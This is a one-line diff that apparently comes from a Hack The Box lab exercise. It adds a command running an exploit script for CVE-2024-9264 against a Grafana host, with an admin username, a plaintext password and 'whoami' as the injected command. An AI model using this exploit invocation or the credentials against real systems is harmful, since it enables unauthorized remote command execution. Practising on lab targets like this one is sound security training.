@@ -1,0 +1,1 @@
+python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb/ 
